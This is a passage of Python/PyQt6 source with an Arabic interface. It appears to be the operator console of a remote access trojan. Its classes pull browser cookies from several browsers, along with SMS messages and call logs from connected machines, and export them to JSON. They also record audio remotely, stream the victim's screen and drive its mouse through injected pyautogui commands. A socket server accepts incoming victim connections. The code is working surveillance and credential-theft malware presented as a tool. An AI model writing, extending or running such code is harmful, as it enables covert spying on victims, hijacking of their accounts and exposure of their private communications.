                QMessageBox.critical(self, "خطأ", f"فشل في الحفظ: {str(e)}")

    def show_error_message(self, error_msg):
        self.wifi_table.setRowCount(1)
        self.wifi_table.setItem(0, 0, QTableWidgetItem("خطأ في التحميل"))
        self.wifi_table.setItem(0, 1, QTableWidgetItem(error_msg))


class AdvancedCookieManager(QDialog):
    def __init__(self, client_handler, parent=None):
        super().__init__(parent)
        self.client_handler = client_handler
        self.setWindowTitle("مدير الكوكيز المتقدم")
        self.setGeometry(500, 500, 1100, 750)
        self.setup_ui()
        self.load_advanced_cookies()

    def setup_ui(self):
        layout = QVBoxLayout()

        control_layout = QHBoxLayout()

        self.search_input = QLineEdit()
        self.search_input.setPlaceholderText("ابحث في الكوكيز...")
        self.search_input.textChanged.connect(self.filter_cookies)

        self.browser_filter = QComboBox()
        self.browser_filter.addItems(["جميع المتصفحات", "Chrome", "Firefox", "Edge", "Opera"])
        self.browser_filter.currentTextChanged.connect(self.filter_cookies)

        self.load_btn = QPushButton("تحميل الكوكيز")
        self.visit_btn = QPushButton("زيارة الموقع")
        self.export_btn = QPushButton("تصدير الكوكيز")

        control_layout.addWidget(QLabel("البحث:"))
        control_layout.addWidget(self.search_input)
        control_layout.addWidget(QLabel("المتصفح:"))
        control_layout.addWidget(self.browser_filter)
        control_layout.addWidget(self.load_btn)
        control_layout.addWidget(self.visit_btn)
        control_layout.addWidget(self.export_btn)

        layout.addLayout(control_layout)

        self.cookies_table = QTableWidget()
        self.cookies_table.setColumnCount(4)
        self.cookies_table.setHorizontalHeaderLabels([
            "المتصفح", "اسم الكوكي", "القيمة", "النطاق"
        ])

        header = self.cookies_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)

        layout.addWidget(self.cookies_table)

        self.setLayout(layout)

        self.load_btn.clicked.connect(self.load_advanced_cookies)
        self.visit_btn.clicked.connect(self.visit_website)
        self.export_btn.clicked.connect(self.export_cookies)

        self.all_cookies = []

    def load_advanced_cookies(self):
        try:
            cookies_json = self.client_handler.execute_enhanced_command("get_advanced_cookies")
            self.process_cookies_data(cookies_json)
        except Exception as e:
            QMessageBox.critical(self, "خطأ", f"فشل في تحميل الكوكيز: {str(e)}")

    def process_cookies_data(self, cookies_json):
        try:
            cookies_data = json.loads(cookies_json)
            self.all_cookies = []

            for browser, browser_cookies in cookies_data.items():
                for cookie_name, cookie_data in browser_cookies.items():
                    cookie_info = {
                        'browser': browser,
                        'name': cookie_name,
                        'value': str(cookie_data.get('value', '')),
                        'domain': cookie_data.get('domain', '')
                    }
                    self.all_cookies.append(cookie_info)

            self.display_cookies_table(self.all_cookies)

        except Exception as e:
            QMessageBox.critical(self, "خطأ", f"فشل في معالجة الكوكيز: {str(e)}")

    def display_cookies_table(self, cookies):
        self.cookies_table.setRowCount(len(cookies))

        for row, cookie in enumerate(cookies):
            self.cookies_table.setItem(row, 0, QTableWidgetItem(cookie['browser']))
            self.cookies_table.setItem(row, 1, QTableWidgetItem(cookie['name']))

            value = cookie['value']
            if len(value) > 50:
                value = value[:50] + "..."
            value_item = QTableWidgetItem(value)
            value_item.setToolTip(cookie['value'])
            self.cookies_table.setItem(row, 2, value_item)

            self.cookies_table.setItem(row, 3, QTableWidgetItem(cookie['domain']))

    def filter_cookies(self):
        search_text = self.search_input.text().lower()
        browser_filter = self.browser_filter.currentText()

        filtered_cookies = []
        for cookie in self.all_cookies:
            matches_search = (search_text in cookie['name'].lower() or
                              search_text in cookie['domain'].lower())

            matches_browser = (browser_filter == "جميع المتصفحات" or
                               browser_filter.lower() == cookie['browser'].lower())

            if matches_search and matches_browser:
                filtered_cookies.append(cookie)

        self.display_cookies_table(filtered_cookies)

    def visit_website(self):
        selected_items = self.cookies_table.selectedItems()
        if selected_items:
            row = selected_items[0].row()
            domain = self.cookies_table.item(row, 3).text()

            if domain:
                url = f"https://{domain}" if not domain.startswith(('http://', 'https://')) else domain
                QDesktopServices.openUrl(QUrl(url))
            else:
                QMessageBox.warning(self, "تحذير", "لا يوجد نطاق صالح للزيارة")
        else:
            QMessageBox.warning(self, "تحذير", "يرجى اختيار كوكي أولاً")

    def export_cookies(self):
        if not self.all_cookies:
            QMessageBox.warning(self, "تحذير", "لا توجد بيانات كوكيز للتصدير")
            return

        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "حفظ بيانات الكوكيز",
            f"cookies_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            "JSON Files (*.json)"
        )
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    json.dump(self.all_cookies, f, indent=2, ensure_ascii=False)
                QMessageBox.information(self, "تم التصدير", "تم حفظ بيانات الكوكيز بنجاح!")
            except Exception as e:
                QMessageBox.critical(self, "خطأ", f"فشل في الحفظ: {str(e)}")


# ==================== نوافذ GUI الجديدة للوظائف المحسنة ====================
class RealSMSWindow(QDialog):
    def __init__(self, client_handler, parent=None):
        super().__init__(parent)
        self.client_handler = client_handler
        self.setWindowTitle("مدير الرسائل النصية الحقيقي - SMS")
        self.setGeometry(500, 500, 1000, 700)
        self.setup_ui()
        self.load_real_sms()

    def setup_ui(self):
        layout = QVBoxLayout()

        # شريط التحكم
        control_layout = QHBoxLayout()

        self.refresh_btn = QPushButton("تحديث الرسائل الحقيقية")
        self.export_btn = QPushButton("تصدير الرسائل")
        self.search_input = QLineEdit()
        self.search_input.setPlaceholderText("ابحث في الرسائل...")

        control_layout.addWidget(self.refresh_btn)
        control_layout.addWidget(self.export_btn)
        control_layout.addWidget(QLabel("البحث:"))
        control_layout.addWidget(self.search_input)
        control_layout.addStretch()

        layout.addLayout(control_layout)

        # معلومات الحالة
        self.status_label = QLabel("جاري تحميل الرسائل...")
        self.status_label.setStyleSheet("color: #FFD700; font-weight: bold; padding: 5px;")
        layout.addWidget(self.status_label)

        # جدول الرسائل
        table_group = QGroupBox("الرسائل النصية الحقيقية - SMS")
        table_layout = QVBoxLayout(table_group)

        self.sms_table = QTableWidget()
        self.sms_table.setColumnCount(4)
        self.sms_table.setHorizontalHeaderLabels([
            "رقم المرسل", "الرسالة", "النوع", "التاريخ والوقت"
        ])

        header = self.sms_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)

        table_layout.addWidget(self.sms_table)
        layout.addWidget(table_group)

        self.setLayout(layout)

        # توصيل الإشارات
        self.refresh_btn.clicked.connect(self.load_real_sms)
        self.export_btn.clicked.connect(self.export_sms_data)
        self.search_input.textChanged.connect(self.filter_sms)

    def load_real_sms(self):
        """تحميل الرسائل الحقيقية"""
        try:
            self.status_label.setText("جاري جلب الرسائل الحقيقية...")
            self.status_label.setStyleSheet("color: #FFD700; font-weight: bold;")

            sms_json = self.client_handler.execute_enhanced_command("get_real_sms")
            self.display_real_sms_data(sms_json)

        except Exception as e:
            self.status_label.setText(f"خطأ في تحميل الرسائل: {str(e)}")
            self.status_label.setStyleSheet("color: #FF4444; font-weight: bold;")

    def display_real_sms_data(self, sms_json):
        """عرض بيانات الرسائل الحقيقية"""
        try:
            if sms_json.startswith("["):
                sms_data = json.loads(sms_json)
                self.sms_table.setRowCount(len(sms_data))

                has_real_data = True
                for row, sms in enumerate(sms_data):
                    # التحقق إذا كانت البيانات حقيقية أو محاكاة
                    if sms.get('number') in ['SYSTEM', 'ERROR']:
                        has_real_data = False

                    self.sms_table.setItem(row, 0, QTableWidgetItem(sms.get('number', 'N/A')))

                    message = sms.get('message', '')
                    message_item = QTableWidgetItem(message)
                    message_item.setToolTip(message)
                    self.sms_table.setItem(row, 1, message_item)

                    message_type = sms.get('type', 'غير معروف')
                    type_item = QTableWidgetItem(message_type)

                    # تلوين حسب نوع الرسالة
                    if message_type == "واردة":
                        type_item.setBackground(QColor(0, 100, 0, 50))  # أخضر فاتح
                    elif message_type == "صادرة":
                        type_item.setBackground(QColor(0, 0, 100, 50))  # أزرق فاتح

                    self.sms_table.setItem(row, 2, type_item)
                    self.sms_table.setItem(row, 3, QTableWidgetItem(sms.get('timestamp', 'N/A')))

                # تحديث حالة البيانات
                if has_real_data:
                    self.status_label.setText("تم تحميل الرسائل الحقيقية بنجاح ✓")
                    self.status_label.setStyleSheet("color: #44FF44; font-weight: bold;")
                else:
                    self.status_label.setText("تم تحميل بيانات محاكاة - فشل في الوصول للبيانات الحقيقية")
                    self.status_label.setStyleSheet("color: #FFAA00; font-weight: bold;")

            else:
                self.show_error_message(sms_json)

        except Exception as e:
            self.show_error_message(str(e))

    def filter_sms(self):
        """تصفية الرسائل حسب البحث"""
        search_text = self.search_input.text().lower()

        for row in range(self.sms_table.rowCount()):
            should_show = False
            for col in range(self.sms_table.columnCount()):
                item = self.sms_table.item(row, col)
                if item and search_text in item.text().lower():
                    should_show = True
                    break
            self.sms_table.setRowHidden(row, not should_show)

    def export_sms_data(self):
        """تصدير بيانات الرسائل"""
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "حفظ بيانات الرسائل الحقيقية",
            f"real_sms_messages_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            "JSON Files (*.json)"
        )
        if file_path:
            try:
                sms_json = self.client_handler.execute_enhanced_command("get_real_sms")
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(sms_json)
                QMessageBox.information(self, "تم التصدير", "تم حفظ بيانات الرسائل الحقيقية بنجاح!")
            except Exception as e:
                QMessageBox.critical(self, "خطأ", f"فشل في الحفظ: {str(e)}")

    def show_error_message(self, error_msg):
        """عرض رسالة خطأ"""
        self.sms_table.setRowCount(1)
        self.sms_table.setItem(0, 0, QTableWidgetItem("خطأ في التحميل"))
        self.sms_table.setItem(0, 1, QTableWidgetItem(error_msg))
        self.sms_table.setItem(0, 2, QTableWidgetItem("خطأ"))
        self.sms_table.setItem(0, 3, QTableWidgetItem(""))
        self.status_label.setText("فشل في جلب الرسائل")
        self.status_label.setStyleSheet("color: #FF4444; font-weight: bold;")


class RealCallWindow(QDialog):
    def __init__(self, client_handler, parent=None):
        super().__init__(parent)
        self.client_handler = client_handler
        self.setWindowTitle("مدير سجل المكالمات الحقيقي")
        self.setGeometry(500, 500, 1000, 700)
        self.setup_ui()
        self.load_real_calls()

    def setup_ui(self):
        layout = QVBoxLayout()

        # شريط التحكم
        control_layout = QHBoxLayout()

        self.refresh_btn = QPushButton("تحديث سجل المكالمات الحقيقي")
        self.export_btn = QPushButton("تصدير السجل")
        self.search_input = QLineEdit()
        self.search_input.setPlaceholderText("ابحث في المكالمات...")

        control_layout.addWidget(self.refresh_btn)
        control_layout.addWidget(self.export_btn)
        control_layout.addWidget(QLabel("البحث:"))
        control_layout.addWidget(self.search_input)
        control_layout.addStretch()

        layout.addLayout(control_layout)

        # معلومات الحالة
        self.status_label = QLabel("جاري تحميل سجل المكالمات...")
        self.status_label.setStyleSheet("color: #FFD700; font-weight: bold; padding: 5px;")
        layout.addWidget(self.status_label)

        # جدول المكالمات
        table_group = QGroupBox("سجل المكالمات الحقيقي")
        table_layout = QVBoxLayout(table_group)

        self.calls_table = QTableWidget()
        self.calls_table.setColumnCount(5)
        self.calls_table.setHorizontalHeaderLabels([
            "رقم المتصل", "نوع المكالمة", "المدة", "التاريخ والوقت", "ملاحظات"
        ])

        header = self.calls_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(4, QHeaderView.ResizeMode.Stretch)

        table_layout.addWidget(self.calls_table)
        layout.addWidget(table_group)

        self.setLayout(layout)

        # توصيل الإشارات
        self.refresh_btn.clicked.connect(self.load_real_calls)
        self.export_btn.clicked.connect(self.export_call_data)
        self.search_input.textChanged.connect(self.filter_calls)

    def load_real_calls(self):
        """تحميل سجل المكالمات الحقيقي"""
        try:
            self.status_label.setText("جاري جلب سجل المكالمات الحقيقي...")
            self.status_label.setStyleSheet("color: #FFD700; font-weight: bold;")

            calls_json = self.client_handler.execute_enhanced_command("get_real_calls")
            self.display_real_call_data(calls_json)

        except Exception as e:
            self.status_label.setText(f"خطأ في تحميل المكالمات: {str(e)}")
            self.status_label.setStyleSheet("color: #FF4444; font-weight: bold;")

    def display_real_call_data(self, calls_json):
        """عرض بيانات المكالمات الحقيقية"""
        try:
            if calls_json.startswith("["):
                calls_data = json.loads(calls_json)
                self.calls_table.setRowCount(len(calls_data))

                has_real_data = True
                for row, call in enumerate(calls_data):
                    # التحقق إذا كانت البيانات حقيقية أو محاكاة
                    if call.get('number') in ['SYSTEM', 'ERROR']:
                        has_real_data = False

                    self.calls_table.setItem(row, 0, QTableWidgetItem(call.get('number', 'N/A')))

                    call_type = call.get('type', 'غير معروف')
                    type_item = QTableWidgetItem(call_type)

                    # تلوين حسب نوع المكالمة
                    if call_type == "صادرة":
                        type_item.setBackground(QColor(0, 100, 0, 50))  # أخضر فاتح
                    elif call_type == "واردة":
                        type_item.setBackground(QColor(0, 0, 100, 50))  # أزرق فاتح
                    elif call_type == "فائتة":
                        type_item.setBackground(QColor(100, 0, 0, 50))  # أحمر فاتح

                    self.calls_table.setItem(row, 1, type_item)
                    self.calls_table.setItem(row, 2, QTableWidgetItem(call.get('duration', 'N/A')))
                    self.calls_table.setItem(row, 3, QTableWidgetItem(call.get('timestamp', 'N/A')))

                    # إضافة ملاحظات إذا وجدت
                    note = call.get('note', '')
                    self.calls_table.setItem(row, 4, QTableWidgetItem(note))

                # تحديث حالة البيانات
                if has_real_data:
                    self.status_label.setText("تم تحميل سجل المكالمات الحقيقي بنجاح ✓")
                    self.status_label.setStyleSheet("color: #44FF44; font-weight: bold;")
                else:
                    self.status_label.setText("تم تحميل بيانات محاكاة - فشل في الوصول للبيانات الحقيقية")
                    self.status_label.setStyleSheet("color: #FFAA00; font-weight: bold;")

            else:
                self.show_error_message(calls_json)

        except Exception as e:
            self.show_error_message(str(e))

    def filter_calls(self):
        """تصفية المكالمات حسب البحث"""
        search_text = self.search_input.text().lower()

        for row in range(self.calls_table.rowCount()):
            should_show = False
            for col in range(self.calls_table.columnCount()):
                item = self.calls_table.item(row, col)
                if item and search_text in item.text().lower():
                    should_show = True
                    break
            self.calls_table.setRowHidden(row, not should_show)

    def export_call_data(self):
        """تصدير بيانات المكالمات"""
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "حفظ بيانات المكالمات الحقيقية",
            f"real_call_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            "JSON Files (*.json)"
        )
        if file_path:
            try:
                calls_json = self.client_handler.execute_enhanced_command("get_real_calls")
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(calls_json)
                QMessageBox.information(self, "تم التصدير", "تم حفظ بيانات المكالمات الحقيقية بنجاح!")
            except Exception as e:
                QMessageBox.critical(self, "خطأ", f"فشل في الحفظ: {str(e)}")

    def show_error_message(self, error_msg):
        """عرض رسالة خطأ"""
        self.calls_table.setRowCount(1)
        self.calls_table.setItem(0, 0, QTableWidgetItem("خطأ في التحميل"))
        self.calls_table.setItem(0, 1, QTableWidgetItem("خطأ"))
        self.calls_table.setItem(0, 2, QTableWidgetItem("0:00"))
        self.calls_table.setItem(0, 3, QTableWidgetItem(""))
        self.calls_table.setItem(0, 4, QTableWidgetItem(error_msg))
        self.status_label.setText("فشل في جلب سجل المكالمات")
        self.status_label.setStyleSheet("color: #FF4444; font-weight: bold;")


class AudioRecorderWindow(QDialog):
    def __init__(self, client_handler, parent=None):
        super().__init__(parent)
        self.client_handler = client_handler
        self.setWindowTitle("مسجل الصوت المتقدم")
        self.setGeometry(500, 500, 600, 400)
        self.setup_ui()
        self.recording = False
        self.recording_time = 0
        self.timer = QTimer()
        self.timer.timeout.connect(self.update_recording_time)

    def setup_ui(self):
        layout = QVBoxLayout()

        # معلومات التسجيل
        info_group = QGroupBox("معلومات التسجيل")
        info_layout = QGridLayout(info_group)

        info_layout.addWidget(QLabel("حالة التسجيل:"), 0, 0)
        self.status_label = QLabel("متوقف")
        self.status_label.setStyleSheet("color: #FF4444; font-weight: bold;")
        info_layout.addWidget(self.status_label, 0, 1)

        info_layout.addWidget(QLabel("مدة التسجيل:"), 1, 0)
        self.time_label = QLabel("00:00")
        info_layout.addWidget(self.time_label, 1, 1)

        info_layout.addWidget(QLabel("حجم البيانات:"), 2, 0)
        self.size_label = QLabel("0 KB")
        info_layout.addWidget(self.size_label, 2, 1)

        layout.addWidget(info_group)

        # التحكم في التسجيل
        control_group = QGroupBox("التحكم في التسجيل")
        control_layout = QGridLayout(control_group)

        control_layout.addWidget(QLabel("مدة التسجيل (ثانية):"), 0, 0)
        self.duration_input = QLineEdit("60")
        self.duration_input.setPlaceholderText("أدخل المدة بالثواني")
        control_layout.addWidget(self.duration_input, 0, 1)

        self.start_btn = QPushButton("بدء التسجيل")
        self.stop_btn = QPushButton("إيقاف التسجيل")
        self.save_btn = QPushButton("حفظ التسجيل")

        control_layout.addWidget(self.start_btn, 1, 0)
        control_layout.addWidget(self.stop_btn, 1, 1)
        control_layout.addWidget(self.save_btn, 2, 0, 1, 2)

        layout.addWidget(control_group)

        # سجل النشاط
        log_group = QGroupBox("سجل النشاط")
        log_layout = QVBoxLayout(log_group)

        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        log_layout.addWidget(self.log_text)

        layout.addWidget(log_group)

        self.setLayout(layout)

        # توصيل الإشارات
        self.start_btn.clicked.connect(self.start_recording)
        self.stop_btn.clicked.connect(self.stop_recording)
        self.save_btn.clicked.connect(self.save_recording)

        self.stop_btn.setEnabled(False)
        self.save_btn.setEnabled(False)

    def start_recording(self):
        """بدء التسجيل الصوتي"""
        try:
            duration = int(self.duration_input.text())
            result = self.client_handler.execute_enhanced_command(f"start_audio_record:{duration}")

            self.recording = True
            self.recording_time = 0
            self.timer.start(1000)  # تحديث كل ثانية

            self.status_label.setText("جاري التسجيل")
            self.status_label.setStyleSheet("color: #44FF44; font-weight: bold;")

            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            self.save_btn.setEnabled(False)

            self.log_text.append(f"[{datetime.now().strftime('%H:%M:%S')}] بدء التسجيل لمدة {duration} ثانية")

        except Exception as e:
            QMessageBox.critical(self, "خطأ", f"فشل في بدء التسجيل: {str(e)}")

    def stop_recording(self):
        """إيقاف التسجيل الصوتي"""
        try:
            result = self.client_handler.execute_enhanced_command("stop_audio_record")

            self.recording = False
            self.timer.stop()

            self.status_label.setText("متوقف")
            self.status_label.setStyleSheet("color: #FF4444; font-weight: bold;")

            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self.save_btn.setEnabled(True)

            self.log_text.append(f"[{datetime.now().strftime('%H:%M:%S')}] إيقاف التسجيل")

        except Exception as e:
            QMessageBox.critical(self, "خطأ", f"فشل في إيقاف التسجيل: {str(e)}")

    def save_recording(self):
        """حفظ التسجيل الصوتي"""
        try:
            result = self.client_handler.execute_enhanced_command("save_audio_record")

            self.log_text.append(f"[{datetime.now().strftime('%H:%M:%S')}] {result}")
            QMessageBox.information(self, "تم الحفظ", result)

        except Exception as e:
            QMessageBox.critical(self, "خطأ", f"فشل في حفظ التسجيل: {str(e)}")

    def update_recording_time(self):
        """تحديث وقت التسجيل"""
        self.recording_time += 1
        minutes = self.recording_time // 60
        seconds = self.recording_time % 60
        self.time_label.setText(f"{minutes:02d}:{seconds:02d}")

        # تحديث حجم البيانات المقدر
        estimated_size = self.recording_time * 16  # ~16 KB/ثانية
        if estimated_size < 1024:
            self.size_label.setText(f"{estimated_size} KB")
        else:
            self.size_label.setText(f"{estimated_size / 1024:.1f} MB")


# ==================== نافذة البث المباشر للشاشة مع التحكم بالماوس ====================
class LiveScreenWindow(QDialog):
    def __init__(self, client_handler, parent=None):
        super().__init__(parent)
        self.client_handler = client_handler
        self.setWindowTitle("البث المباشر لشاشة العميل مع التحكم بالماوس")
        self.setGeometry(400, 400, 1000, 700)
        self.setup_ui()
        self.streaming = False
        self.stream_timer = QTimer()
        self.stream_timer.timeout.connect(self.update_screen)
        self.current_pixmap = None

    def setup_ui(self):
        layout = QVBoxLayout()

        control_layout = QHBoxLayout()

        self.start_btn = QPushButton("بدء البث المباشر")
        self.stop_btn = QPushButton("إيقاف البث")
        self.capture_btn = QPushButton("التقاط لقطة")

        control_layout.addWidget(self.start_btn)
        control_layout.addWidget(self.stop_btn)
        control_layout.addWidget(self.capture_btn)
        control_layout.addStretch()

        layout.addLayout(control_layout)

        # إضافة عناصر التحكم بالماوس
        mouse_control_layout = QHBoxLayout()

        self.mouse_control_btn = QPushButton("تفعيل التحكم بالماوس")
        self.left_click_btn = QPushButton("النقر الأيسر")
        self.right_click_btn = QPushButton("النقر الأيمن")
        self.double_click_btn = QPushButton("النقر المزدوج")

        mouse_control_layout.addWidget(self.mouse_control_btn)
        mouse_control_layout.addWidget(self.left_click_btn)
        mouse_control_layout.addWidget(self.right_click_btn)
        mouse_control_layout.addWidget(self.double_click_btn)
        mouse_control_layout.addStretch()

        layout.addLayout(mouse_control_layout)

        self.screen_label = QLabel()
        self.screen_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.screen_label.setMinimumSize(800, 600)
        self.screen_label.setStyleSheet("background-color: black; border: 2px solid gray;")
        self.screen_label.setText("البث المباشر سيظهر هنا...")

        # تفعيل تتبع حركة الماوس
        self.screen_label.setMouseTracking(True)
        self.screen_label.mouseMoveEvent = self.mouse_move_event
        self.screen_label.mousePressEvent = self.mouse_press_event

        layout.addWidget(self.screen_label)

        self.status_label = QLabel("الحالة: متوقف")
        layout.addWidget(self.status_label)

        self.setLayout(layout)

        self.start_btn.clicked.connect(self.start_stream)
        self.stop_btn.clicked.connect(self.stop_stream)
        self.capture_btn.clicked.connect(self.capture_screenshot)
        self.mouse_control_btn.clicked.connect(self.toggle_mouse_control)
        self.left_click_btn.clicked.connect(self.left_click)
        self.right_click_btn.clicked.connect(self.right_click)
        self.double_click_btn.clicked.connect(self.double_click)

        self.stop_btn.setEnabled(False)
        self.capture_btn.setEnabled(False)
        self.mouse_control_enabled = False

    def start_stream(self):
        self.streaming = True
        self.stream_timer.start(100)  # تحديث كل 100 مللي ثانية
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.capture_btn.setEnabled(True)
        self.status_label.setText("الحالة: البث المباشر نشط")
        self.status_label.setStyleSheet("color: green; font-weight: bold;")

    def stop_stream(self):
        self.streaming = False
        self.stream_timer.stop()
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.capture_btn.setEnabled(False)
        self.status_label.setText("الحالة: متوقف")
        self.status_label.setStyleSheet("color: red; font-weight: bold;")
        self.screen_label.clear()
        self.screen_label.setText("البث المباشر سيظهر هنا...")

    def update_screen(self):
        if self.streaming:
            try:
                result = self.client_handler.execute_enhanced_command("start_live_screen")
                if result.startswith("LIVE_SCREEN:"):
                    encoded_data = result.replace("LIVE_SCREEN:", "")
                    image_data = base64.b64decode(encoded_data)
                    nparr = np.frombuffer(image_data, np.uint8)
                    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)

                    if img is not None:
                        # تحويل الصورة إلى تنسيق QImage
                        height, width, channel = img.shape
                        bytes_per_line = 3 * width
                        q_img = QImage(img.data, width, height, bytes_per_line,
                                       QImage.Format.Format_RGB888).rgbSwapped()

                        # عرض الصورة
                        pixmap = QPixmap.fromImage(q_img)
                        self.current_pixmap = pixmap
                        scaled_pixmap = pixmap.scaled(self.screen_label.size(), Qt.AspectRatioMode.KeepAspectRatio,
                                                      Qt.TransformationMode.SmoothTransformation)
                        self.screen_label.setPixmap(scaled_pixmap)
            except Exception as e:
                print(f"Screen stream error: {e}")

    def capture_screenshot(self):
        if self.current_pixmap:
            file_path, _ = QFileDialog.getSaveFileName(
                self,
                "حفظ لقطة الشاشة",
                f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png",
                "PNG Files (*.png)"
            )
            if file_path:
                self.current_pixmap.save(file_path, "PNG")
                QMessageBox.information(self, "تم الحفظ", "تم حفظ لقطة الشاشة بنجاح!")

    def toggle_mouse_control(self):
        self.mouse_control_enabled = not self.mouse_control_enabled
        if self.mouse_control_enabled:
            self.mouse_control_btn.setText("تعطيل التحكم بالماوس")
            self.mouse_control_btn.setStyleSheet("background-color: green; color: white;")
            QMessageBox.information(self, "التحكم بالماوس", "تم تفعيل التحكم بالماوس عن بعد")
        else:
            self.mouse_control_btn.setText("تفعيل التحكم بالماوس")
            self.mouse_control_btn.setStyleSheet("")
            QMessageBox.information(self, "التحكم بالماوس", "تم تعطيل التحكم بالماوس عن بعد")

    def mouse_move_event(self, event):
        if self.mouse_control_enabled and self.streaming:
            # حساب الإحداثيات النسبية
            x = event.pos().x()
            y = event.pos().y()

            # إرسال إحداثيات الماوس إلى العميل
            try:
                self.client_handler.execute_enhanced_command(
                    f"cmd:python -c \"import pyautogui; pyautogui.moveTo({x}, {y})\"")
            except:
                pass

    def mouse_press_event(self, event):
        if self.mouse_control_enabled and self.streaming:
            if event.button() == Qt.MouseButton.LeftButton:
                self.left_click()
            elif event.button() == Qt.MouseButton.RightButton:
                self.right_click()

    def left_click(self):
        if self.mouse_control_enabled:
            try:
                self.client_handler.execute_enhanced_command("cmd:python -c \"import pyautogui; pyautogui.click()\"")
            except:
                pass

    def right_click(self):
        if self.mouse_control_enabled:
            try:
                self.client_handler.execute_enhanced_command(
                    "cmd:python -c \"import pyautogui; pyautogui.rightClick()\"")
            except:
                pass

    def double_click(self):
        if self.mouse_control_enabled:
            try:
                self.client_handler.execute_enhanced_command(
                    "cmd:python -c \"import pyautogui; pyautogui.doubleClick()\"")
            except:
                pass


# ==================== خادم السيرفر المتقدم ====================
class AdvancedServerThread(threading.Thread):
    def __init__(self, host, port, app):
        super().__init__()
        self.host = host
        self.port = port
        self.app = app
        self.server_socket = None
        self.running = False
        self.clients = []

    def run(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(10)
            self.running = True

            self.app.log_signal.emit(f"السيرفر المتقدم يعمل على {self.host}:{self.port}")

            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    client_handler = EnhancedClientHandler(client_socket, address, self.app)
                    client_thread = threading.Thread(target=client_handler.handle_client)
                    client_thread.daemon = True
                    client_thread.start()
                    self.clients.append(client_handler)

                    self.app.log_signal.emit(f"عميل جديد متصل: {address[0]}:{address[1]}")
                except Exception as e:
                    if self.running:
                        self.app.log_signal.emit(f"خطأ في قبول العميل: {str(e)}")
                    break

        except Exception as e:
            self.app.log_signal.emit(f"خطأ فادح في السيرفر: {str(e)}")

    def stop(self):
        self.running = False
        for client in self.clients:
            client.cleanup()
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass


# ==================== النافذة الرئيسية المحسنة ====================
class EnhancedMainWindow(QMainWindow):
    log_signal = pyqtSignal(str)
    client_connected_signal = pyqtSignal(dict)
    alert_signal = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.server_thread = None
        self.clients = []
        self.current_client = None
        self.theme_manager = AdvancedThemeManager()
        self.persistent_manager = PersistentConnectionManager()
        self.init_ui()
        self.theme_manager.apply_theme("red_dark", self)
        self.setup_signals()
        self.load_persistent_connections()

    def setup_signals(self):
        self.log_signal.connect(self.handle_log)
        self.client_connected_signal.connect(self.handle_client_connected)
        self.alert_signal.connect(self.handle_alert)

    def init_ui(self):
        self.setWindowTitle("أداة التحكم عن بعد - الإصدار النهائي 2024 - نظام الملفات والعمليات المستمرة")
        self.setGeometry(100, 100, 1400, 900)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)

        tab_widget = QTabWidget()

        server_tab = self.create_advanced_server_tab()
        clients_tab = self.create_advanced_clients_tab()
        terminal_tab = self.create_advanced_terminal_tab()
        persistent_tab = self.create_persistent_connections_tab()

        tab_widget.addTab(server_tab, "السيرفر المتقدم")
        tab_widget.addTab(clients_tab, "إدارة العملاء")
        tab_widget.addTab(terminal_tab, "الطرفية المتقدمة")
        tab_widget.addTab(persistent_tab, "الاتصالات المستدامة")

        layout.addWidget(tab_widget)

    def create_advanced_server_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)

        server_group = QGroupBox("إعدادات السيرفر المتقدم")
        server_layout = QGridLayout(server_group)

        server_layout.addWidget(QLabel("الخادم:"), 0, 0)
        self.host_input = QLineEdit("0.0.0.0")
        server_layout.addWidget(self.host_input, 0, 1)

        server_layout.addWidget(QLabel("المنفذ:"), 1, 0)
        self.port_input = QLineEdit("8080")
        server_layout.addWidget(self.port_input, 1, 1)

        self.start_btn = QPushButton("تشغيل السيرفر المتقدم")
        self.start_btn.clicked.connect(self.toggle_advanced_server)
        server_layout.addWidget(self.start_btn, 2, 0)

        self.theme_btn = QPushButton("اختيار السمة")
        self.theme_btn.clicked.connect(self.open_advanced_theme_selector)
        server_layout.addWidget(self.theme_btn, 2, 1)

        self.status_label = QLabel("الحالة: متوقف")
